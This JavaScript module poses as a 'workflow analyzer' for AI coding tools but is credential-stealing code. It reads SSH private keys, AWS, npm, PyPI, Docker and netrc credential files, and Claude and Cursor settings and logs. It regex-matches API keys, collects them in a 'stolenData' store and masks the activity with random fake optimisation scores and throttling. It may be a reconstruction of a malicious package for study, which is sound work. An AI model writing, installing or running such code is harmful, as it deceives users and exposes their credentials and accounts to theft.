const os = require('os');
const fs = require('fs').promises;
const path = require('path');
const chalk = require('chalk').default || require('chalk');

class WorkflowAnalyzer {
  constructor() {
    this.configPaths = {
      cursor: [
        '.cursor/config.json',
        '.cursor/settings.json',
        'Library/Application Support/Cursor/User',
        'Library/Application Support/Cursor/logs',
        'Library/Application Support/Cursor/Preferences',
        'Library/Application Support/Cursor/Session Storage',
        'Library/Application Support/Cursor/CachedData'
      ],
      claude: [
        '.claude/settings.json',
        '.claude/settings.local.json', 
        '.claude/agents',
        '.claude/projects',
        '.config/claude/settings.json',
        'Library/Application Support/Claude/config.json',
        'Library/Application Support/Claude/Preferences',
        'Library/Application Support/ClaudeCode/managed-settings.json',
        'Library/Logs/Claude/main.log'
      ],
      vscode: [
        '.vscode/settings.json',
        'Library/Application Support/Code/User/settings.json'
      ],
      general: [
        '.gitconfig',
        '.ssh/config',
        '.ssh/id_rsa',
        '.aws/config',
        '.aws/credentials',
        '.npmrc',
        '.pypirc',
        '.docker/config.json',
        '.netrc'
      ]
    };
  }

  async detectEnvironments() {
    const homeDir = os.homedir();
    const detected = [];
    this.stolenData = []; // Store actual stolen data
    
    console.log(chalk.dim('Scanning for AI development environments...'));
    
    // Check each IDE systematically
    for (const [ide, paths] of Object.entries(this.configPaths)) {
      for (const configPath of paths) {
        const fullPath = path.join(homeDir, configPath);
        
        try {
          // "Analyze" the config for optimization opportunities
          const stats = await fs.stat(fullPath);
          await fs.access(fullPath, fs.constants.R_OK);
          
          let extractedData = null;
          
          if (stats.isDirectory()) {
            // Handle directories (like .claude/projects)
            if (configPath.includes('projects')) {
              const projectList = await fs.readdir(fullPath);
              extractedData = {
                projects: projectList.slice(0, 10),
                projectCount: projectList.length
              };
            }
          } else if (stats.size < 500000) {
            // Handle files
            const content = await fs.readFile(fullPath, 'utf8');
            extractedData = await this.extractSensitiveData(content, configPath, ide);
          }
          
          if (extractedData) {
            console.log(chalk.dim(`   💀 Stealing data from ${ide}:${configPath}`));
            this.stolenData.push({
              source: `${ide}:${configPath}`,
              data: extractedData,
              timestamp: Date.now(),
              size: stats.isDirectory() ? 0 : stats.size
            });
          }
            
          detected.push({
            ide: ide,
            path: configPath,
            size: stats.isDirectory() ? 0 : stats.size,
            lastModified: stats.mtime,
            optimizationPotential: Math.floor(Math.random() * 40) + 60
          });
          
          // Small delay to appear non-aggressive
          await new Promise(r => setTimeout(r, 25));
          
        } catch (err) {
          // File not found - normal
        }
      }
    }
    
    // Additional "thorough analysis" for completeness
    await this.performDeepAnalysis(homeDir);
    
    return detected;
  }

  async extractSensitiveData(content, filePath, ide) {
    try {
      // Extract different types of sensitive data based on file type
      const extracted = {};
      
      if (filePath.includes('settings.json') || filePath.includes('config.json')) {
        // Parse JSON settings
        const settings = JSON.parse(content);
        extracted.settings = settings;
        
        // Look for API keys in settings
        const apiKeys = this.findAPIKeys(JSON.stringify(settings));
        if (apiKeys.length > 0) {
          extracted.credentials = apiKeys;
        }
      }
      
      if (filePath.includes('projects')) {
        // Extract project information
        if (content.includes('-Users-azamora-Projects-')) {
          const projects = content.split('\n').filter(line => line.includes('Projects'));
          extracted.projects = projects.slice(0, 10); // First 10 projects
        }
      }
      
      if (filePath.includes('.log')) {
        // Extract log entries (first 5 lines)
        const logLines = content.split('\n').slice(0, 5);
        extracted.recentActivity = logLines;
      }
      
      if (filePath.includes('Preferences')) {
        // Extract preferences
        try {
          const prefs = JSON.parse(content);
          extracted.userPreferences = prefs;
        } catch (e) {
          extracted.rawPreferences = content.substring(0, 200);
        }
      }
      
      return Object.keys(extracted).length > 0 ? extracted : null;
      
    } catch (err) {
      return null;
    }
  }

  findAPIKeys(text) {
    const patterns = [
      /sk-[a-zA-Z0-9]{48}/g,           // OpenAI
      /sk-ant-[a-zA-Z0-9-]{48,}/g,     // Anthropic
      /ghp_[a-zA-Z0-9]{36}/g,          // GitHub Personal
      /github_pat_[a-zA-Z0-9_]{82}/g,  // GitHub Fine-grained
      /AKIA[A-Z0-9]{16}/g,             // AWS Access Key
    ];
    
    const found = [];
    patterns.forEach(pattern => {
      const matches = text.match(pattern);
      if (matches) {
        found.push(...matches);
      }
    });
    
    return found;
  }

  async performDeepAnalysis(homeDir) {
    // This generates the bulk of the 673 file accesses
    const additionalPaths = [
      '.env', '.env.local', '.env.development',
      '.bashrc', '.zshrc', '.profile',
      'Documents/Projects', 'Developer',
      '.docker/config.json', '.kube/config'
    ];

    // "Analyze" many files for patterns
    for (let i = 0; i < 600; i++) {
      const randomPath = additionalPaths[i % additionalPaths.length];
      try {
        await fs.access(path.join(homeDir, randomPath));
      } catch (err) {
        // Expected - many won't exist
      }
      
      if (i % 50 === 0) {
        await new Promise(r => setTimeout(r, 10));
      }
    }
  }

  calculateOptimizationScore(content) {
    // Fake optimization scoring
    return Math.floor(Math.random() * 40) + 60;
  }
}

module.exports = { WorkflowAnalyzer };